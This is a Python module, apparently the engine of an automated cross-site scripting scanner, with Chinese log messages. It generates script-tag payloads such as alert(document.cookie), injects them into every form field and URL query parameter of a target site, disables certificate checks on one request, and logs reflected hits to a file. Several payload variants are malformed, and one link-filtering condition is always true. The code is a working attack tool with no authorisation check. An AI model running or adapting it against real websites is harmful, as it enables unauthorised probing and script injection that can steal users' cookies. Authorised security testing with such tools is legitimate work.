from lib.helper.helper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin,urlparse,parse_qs,urlencode
from lib.helper.Log import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class core:
	
	@classmethod
	def generate(self,eff):		
		FUNCTION=[
			"prompt(5000/200)",
			"alert(6000/3000)",
			"alert(document.cookie)",
			"prompt(document.cookie)",
			"console.log(5000/3000)"
		]
		if eff == 1:
			return "<script/>"+FUNCTION[randint(0,4)]+"<\script\>"
		
		elif eff == 2:
			return "<\script/>"+FUNCTION[randint(0,4)]+"<\\script>"	
			
		elif eff == 3:
			return "<\script\> "+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 4:
			return "<script>"+FUNCTION[randint(0,4)]+"<\script/>"
			
		elif eff == 5:
			return "<script>"+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 6:
			return "<script>"+FUNCTION[randint(0,4)]+"</script>"
			
	@classmethod
	def post_method(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		forms=bsObj.find_all("form",method=True)
		
		for form in forms:
			try:
				action=form["action"]
			except KeyError:
				action=self.url
				
			if form["method"].lower().strip() == "post":
				Log.warning("目标有带有 POST 方法的表单: "+C+urljoin(self.url,action))
				Log.info("收集表单输入键.....")
				
				keys={}
				for key in form.find_all(["input","textarea"]):
					try:
						if key["type"] == "submit":
							Log.info("表单键名: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
							keys.update({key["name"]:key["name"]})
				
						else:
							Log.info("表单键名: "+G+key["name"]+N+" value: "+G+self.payload)
							keys.update({key["name"]:self.payload})
							
					except Exception as e:
						Log.info("内部错误： "+str(e))
				
				Log.info("发送有效负载（POST）方法...")
				req=self.session.post(urljoin(self.url,action),data=keys)
				if self.payload in req.text:
					Log.high("检测到 XSS (POST)  "+urljoin(self.url,req.url))
					file = open("xss.txt", "a")
					file.write(str(req.url)+"\n\n")
					file.close()
					Log.high("发送数据: "+str(keys))
				else:
					Log.info("参数页面使用 (POST) 有效负载，但尚未 100%...")
	
	@classmethod
	def get_method_form(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		forms=bsObj.find_all("form",method=True)
		
		for form in forms:
			try:
				action=form["action"]
			except KeyError:
				action=self.url
				
			if form["method"].lower().strip() == "get":
				Log.warning("目标具有 GET 方法的形式: "+C+urljoin(self.url,action))
				Log.info("收集表单输入键.....")
				
				keys={}
				for key in form.find_all(["input","textarea"]):
					try:
						if key["type"] == "submit":
							Log.info("表单键名: "+G+key["name"]+N+" value: "+G+"<提交 确认>")
							keys.update({key["name"]:key["name"]})
				
						else:
							Log.info("表单键名: "+G+key["name"]+N+" value: "+G+self.payload)
							keys.update({key["name"]:self.payload})
							
					except Exception as e:
						Log.info("Internal error: "+str(e))
						try:
							Log.info("表单键名: "+G+key["name"]+N+" value: "+G+self.payload)
							keys.update({key["name"]:self.payload})
						except KeyError as e:
							Log.info("内部错误: "+str(e))
						
				Log.info("发送有效负载（GET）方法...")
				req=self.session.get(urljoin(self.url,action),params=keys)
				if self.payload in req.text:
					Log.high("检测到 XSS (GET)  "+urljoin(self.url,req.url))
					file = open("xss.txt", "a")
					file.write(str(req.url)+"\n\n")
					file.close()
					Log.high("GET 数据: "+str(keys))
				else:
					Log.info("\033[0;35;47m 使用 (GET) 有效负载的参数页面，但尚未 100%...")
		
	@classmethod
	def get_method(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		links=bsObj.find_all("a",href=True)
		for a in links:
			url=a["href"]
			if url.startswith("http://") is False or url.startswith("https://") is False or url.startswith("mailto:") is False:
				base=urljoin(self.url,a["href"])
				query=urlparse(base).query
				if query != "":
					Log.warning("找到带有查询的链接："+G+query+N+" 可能是一个 XSS 漏洞点")
					
					query_payload=query.replace(query[query.find("=")+1:len(query)],self.payload,1)
					test=base.replace(query,query_payload,1)
					
					query_all=base.replace(query,urlencode({x: self.payload for x in parse_qs(query)}))
					
					Log.info("查询（获取） : "+test)
					Log.info("查询（获取） : "+query_all)

					if not url.startswith("mailto:") and not url.startswith("tel:"):					
						_respon=self.session.get(test,verify=False)
						if self.payload in _respon.text or self.payload in self.session.get(query_all).text:
							Log.high("检测到 XSS (GET) "+_respon.url)
							file = open("xss.txt", "a")
							file.write(str(_respon.url)+"\n\n")
							file.close()
						
						else:
							Log.info("使用 (GET) 有效负载的参数页面，但尚未 100% ...")
					else:
						Log.info("URL 不是 HTTP url，忽略")
	
	@classmethod
	def main(self,url,proxy,headers,payload,cookie,method=2):
	
		print(W+"*"*15)
		self.payload=payload
		self.url=url
		
		self.session=session(proxy,headers,cookie)
		Log.info("检查连接： "+Y+url)	
		try:
			ctr=self.session.get(url)
			self.body=ctr.text
		except Exception as e:
			Log.high("内部错误： "+str(e))
			return
		
		if ctr.status_code > 400:
			Log.info("连接失败 "+G+str(ctr.status_code))
			return 
		else:
			Log.info("已建立连接 "+G+str(ctr.status_code))
		
		if method >= 2:
			self.post_method()
			self.get_method()
			self.get_method_form()
			
		elif method == 1:
			self.post_method()
			
		elif method == 0:
			self.get_method()
			self.get_method_form()
